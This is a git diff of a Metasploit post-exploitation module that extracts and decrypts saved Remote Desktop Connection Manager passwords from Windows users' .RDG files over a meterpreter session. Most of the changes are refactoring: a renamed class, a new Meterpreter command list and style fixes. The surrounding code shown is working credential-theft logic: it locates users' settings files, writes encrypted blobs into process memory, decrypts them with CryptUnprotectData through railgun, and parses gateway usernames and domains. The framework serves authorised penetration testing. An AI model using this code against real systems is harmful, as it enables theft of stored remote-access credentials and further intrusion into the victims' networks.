@@ -1,26 +1,24 @@
 # -*- coding: binary -*-
 
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'rexml/document'
-require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Remote Desktop Connection Manager Saved Password Extraction',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Remote Desktop Connection Manager Saved Password Extraction',
+        'Description' => %q{
           This module extracts and decrypts saved Microsoft Remote Desktop
           Connection Manager (RDCMan) passwords the .RDG files of users.
           The module will attempt to find the files configured for all users
@@ -30,11 +28,27 @@ class Metasploit3 < Msf::Post
           originally encrypted the password.  Passwords stored in plain text will
           be captured and documented.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Tom Sellers <tom[at]fadedcode.net>'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_stat
+              stdapi_railgun_api
+              stdapi_sys_config_getuid
+              stdapi_sys_process_attach
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_memory_write
+            ]
+          }
+        }
+      )
+    )
   end
 
   def run
@@ -50,15 +64,18 @@ class Metasploit3 < Msf::Post
 
     profiles.each do |user|
       next if user['LocalAppData'].nil?
+
       settings_path = "#{user['LocalAppData']}\\#{settings_file}"
       next unless file?(settings_path)
+
       print_status("Found settings for #{user['UserName']}.")
 
       settings = read_file(settings_path)
       connection_files = settings.scan(/string&gt;(.*?)&lt;\/string/)
 
       connection_files.each do |con_f|
-        next unless session.fs.file.exists?(con_f[0])
+        next unless session.fs.file.exist?(con_f[0])
+
         print_status("\tOpening RDC Manager server list: #{con_f[0]}")
         connection_data = read_file(con_f[0])
         if connection_data
@@ -72,8 +89,7 @@ class Metasploit3 < Msf::Post
   end
 
   def decrypt_password(data)
-    rg = session.railgun
-    rg.add_dll('crypt32') unless rg.get_dll('crypt32')
+    session.railgun.add_dll('crypt32') unless session.railgun.get_dll('crypt32')
 
     pid = client.sys.process.getpid
     process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
@@ -81,19 +97,20 @@ class Metasploit3 < Msf::Post
     mem = process.memory.allocate(128)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid && i["arch"] == "x86"}
+    if session.sys.process.each_process.find { |i| i["pid"] == pid && i["arch"] == "x86" }
       addr = [mem].pack("V")
       len = [data.length].pack("V")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
       len, addr = ret["pDataOut"].unpack("V2")
     else
       addr = [mem].pack("Q")
       len = [data.length].pack("Q")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
       len, addr = ret["pDataOut"].unpack("Q2")
     end
 
     return "" if len == 0
+
     decrypted_pw = process.memory.read(addr, len)
     return decrypted_pw
   end
@@ -151,6 +168,7 @@ class Metasploit3 < Msf::Post
     # Process all of the gateway elements, irrespective of server
     doc.elements.each("//gatewaySettings") do |gateway|
       next unless gateway.attributes['inherit'] == "None"
+
       svr_name = gateway.elements['hostName'].text
       username = gateway.elements['userName'].text
       domain = gateway.elements['domain'].text
